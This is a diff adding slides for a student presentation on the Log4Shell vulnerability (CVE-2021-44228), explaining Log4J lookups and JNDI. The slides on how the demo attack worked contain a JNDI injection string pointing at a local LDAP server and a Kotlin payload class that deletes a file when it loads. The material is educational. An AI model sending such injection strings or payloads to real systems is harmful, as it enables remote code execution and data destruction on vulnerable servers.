@@ -5,6 +5,8 @@
     <title>F21AN - Log4J CVE-2021-44228 demo</title>
     <link rel="stylesheet" href="reveal.js/dist/reveal.css">
     <link rel="stylesheet" href="reveal.js/dist/theme/black.css"/>
+    <link rel="stylesheet" href="reveal.js/plugin/highlight/zenburn.css">
+    <script src="reveal.js/plugin/highlight/highlight.js"></script>
 </head>
 <body>
 <div class="reveal">
@@ -13,11 +15,234 @@
             <h4>Log4J CVE-2021-44228 demo</h4>
             <h6>Dewi Payne, Chris Henderson, Adam Malek</h6>
         </section>
+        <section>
+            <section data-auto-animate>
+                <h2>CVE-2021-44228</h2>
+            </section>
+            <section data-auto-animate>
+                <h2>CVE-2021-44228</h2>
+                <ul>
+                    <li>Existed in Log4J - Java logging library</li>
+                </ul>
+            </section>
+            <section data-auto-animate>
+                <h2>CVE-2021-44228</h2>
+                <ul>
+                    <li>Existed in Log4J - Java logging library</li>
+                    <li>Also known as Log4Shell</li>
+                </ul>
+            </section>
+            <section data-auto-animate>
+                <h2>CVE-2021-44228</h2>
+                <ul>
+                    <li>Existed in Log4J - Java logging library</li>
+                    <li>Also known as Log4Shell</li>
+                    <li>Made a huge number of Java apps vulnerable</li>
+                </ul>
+            </section>
+        </section>
+        <section>
+            <h2>Few words about Log4J</h2>
+        </section>
+        <section>
+            <section data-auto-animate>
+                <h2>Extremely easy set up</h2>
+            </section>
+            <section data-auto-animate>
+                <h5>Add the library as a dependency using Gradle/Maven</h5>
+                <pre>
+                    <code data-trim data-noescape>
+dependencies {
+    implementation("org.apache.logging.log4j:log4j-api:2.14.1")
+    implementation("org.apache.logging.log4j:log4j-core:2.14.1")
+}
+                    </code>
+                </pre>
+            </section>
+            <section>
+                <h5>Start logging</h5>
+                <pre>
+                    <code data-trim data-noescape>
+import org.apache.logging.log4j.LogManager
+
+fun main() {
+  val logger = LogManager.getLogger()
+  logger.info("Hello World!")
+}
+                    </code>
+                </pre>
+            </section>
+        </section>
+        <section>
+            <section data-auto-animate>
+                <h2>Lookup Strings</h2>
+            </section>
+            <section data-auto-animate>
+                <h2>Lookup Strings - what are they used for?</h2>
+                <ul>
+                    <li>Event lookup - info about exceptions, message, thread</li>
+                </ul>
+            </section>
+            <section data-auto-animate>
+                <h2>Lookup Strings - what are they used for?</h2>
+                <ul>
+                    <li>Event lookup - info about exceptions, message, thread</li>
+                    <li>Docker/Kubernetes info</li>
+                </ul>
+            </section>
+            <section data-auto-animate>
+                <h2>Lookup Strings - what are they used for?</h2>
+                <ul>
+                    <li>Event lookup - info about exceptions, message, thread</li>
+                    <li>Docker/Kubernetes info</li>
+                    <li>Environment variable lookup</li>
+                </ul>
+            </section>
+            <section data-auto-animate>
+                <h2>Lookup Strings - what are they used for?</h2>
+                <ul>
+                    <li>Event lookup - info about exceptions, message, thread</li>
+                    <li>Docker/Kubernetes info</li>
+                    <li>Environment variable lookup</li>
+                    <li>JNDI lookup</li>
+                </ul>
+            </section>
+        </section>
+        <section>
+            <h2>Java Naming and Directory Interface</h2>
+            <img width="75%" src="https://docs.oracle.com/javase/jndi/tutorial/figures/jndi/getStarted/jndiarch.jpg"/>
+        </section>
+        <section>
+            <h4>Demo</h4>
+            <iframe width="100%" height="400px" src="http://127.0.0.1:8080/"></iframe>
+        </section>
+        <section>
+            <section data-auto-animate>
+                <h2>How did that happen?</h2>
+            </section>
+            <section data-auto-animate>
+                <h2>How did that happen?</h2>
+                <ol>
+                    <li>The request with parameter <code>${jndi:ldap://127.0.0.1:3001/}</code> was sent to the server</li>
+                </ol>
+            </section>
+            <section data-auto-animate>
+                <h2>How did that happen?</h2>
+                <ol>
+                    <li>The request with parameter <code>${jndi:ldap://127.0.0.1:3001/}</code> was sent to the server</li>
+                    <li>The parameter was logged with Log4J</li>
+                </ol>
+            </section>
+            <section data-auto-animate>
+                <h2>How did that happen?</h2>
+                <ol>
+                    <li>The request with parameter <code>${jndi:ldap://127.0.0.1:3001/}</code> was sent to the server</li>
+                    <li>The parameter was logged with Log4J</li>
+                    <li>Log4J performed JNDI lookup</li>
+                </ol>
+            </section>
+            <section data-auto-animate>
+                <h2>How did that happen?</h2>
+                <ol>
+                    <li>The request with parameter <code>${jndi:ldap://127.0.0.1:3001/}</code> was sent to the server</li>
+                    <li>The parameter was logged with Log4J</li>
+                    <li>Log4J performed JNDI lookup</li>
+                    <li>Attacker's LDAP server responded with a JVM class</li>
+                </ol>
+            </section>
+            <section data-auto-animate>
+                <h6>The following code is the payload</h6>
+                <pre>
+                    <code data-trim data-noescape>
+import java.nio.file.Files
+import kotlin.io.path.toPath
+
+
+object Exploit {
+  init {
+    val projectDir = ClassLoader.getSystemResource("static/files/products.json").toURI().toPath()
+    Files.deleteIfExists(projectDir)
+  }
+}
+                    </code>
+                </pre>
+            </section>
+            <section data-auto-animate>
+                <h2>How did that happen?</h2>
+                <ol>
+                    <li>The request with parameter <code>${jndi:ldap://127.0.0.1:3001/}</code> was sent to the server</li>
+                    <li>The parameter was logged with Log4J</li>
+                    <li>Log4J performed JNDI lookup</li>
+                    <li>Attacker's LDAP server responded with a JVM class</li>
+                    <li>Log4J loaded the code - and hence init block was executed</li>
+                </ol>
+            </section>
+        </section>
+        <section>
+            <section data-auto-animate>
+                <h2>Other possible attacks with Log4Shell</h2>
+            </section>
+            <section data-auto-animate>
+                <h2>Other possible attacks with Log4Shell</h2>
+                <ul>
+                    <li>Obtaining keys and passwords to databases or 3rd party services through environment variable
+                        lookups
+                    </li>
+                </ul>
+            </section>
+            <section data-auto-animate>
+                <h2>Other possible attacks with Log4Shell</h2>
+                <ul>
+                    <li>Obtaining keys and passwords to databases or 3rd party services through environment variable
+                        lookups
+                    </li>
+                    <li>Removing or altering site's data (HTML, databases, JavaScript)</li>
+                </ul>
+            </section>
+            <section data-auto-animate>
+                <h2>Other possible attacks with Log4Shell</h2>
+                <ul>
+                    <li>Obtaining keys and passwords to databases or 3rd party services through environment variable
+                        lookups
+                    </li>
+                    <li>Removing or altering site's data (HTML, databases, JavaScript)</li>
+                    <li>Using other attacks to gain access to the superuser</li>
+                </ul>
+            </section>
+        </section>
+        <section>
+            <section data-auto-animate>
+                <h2>Conclusion</h2>
+            </section>
+            <section data-auto-animate>
+                <h2>Conclusion</h2>
+                <ul>
+                    <li>Luckily the vulnerability was quickly patched</li>
+                </ul>
+            </section>
+            <section data-auto-animate>
+                <h2>Conclusion</h2>
+                <ul>
+                    <li>Luckily the vulnerability was quickly patched</li>
+                    <li>Initial recommendations were to disable the feature</li>
+                </ul>
+            </section>
+            <section data-auto-animate>
+                <h2>Conclusion</h2>
+                <ul>
+                    <li>Luckily the vulnerability was quickly patched</li>
+                    <li>Initial recommendations were to disable the feature</li>
+                    <li>Perhaps opt-in is better than opt-out for advanced features?</li>
+                </ul>
+            </section>
+        </section>
     </div>
 </div>
 </body>
 <script src="/reveal.js/dist/reveal.js"></script>
 <script>
-    Reveal.initialize();
+    Reveal.initialize({
+        plugins: [RevealHighlight]
+    });
 </script>
 </html>
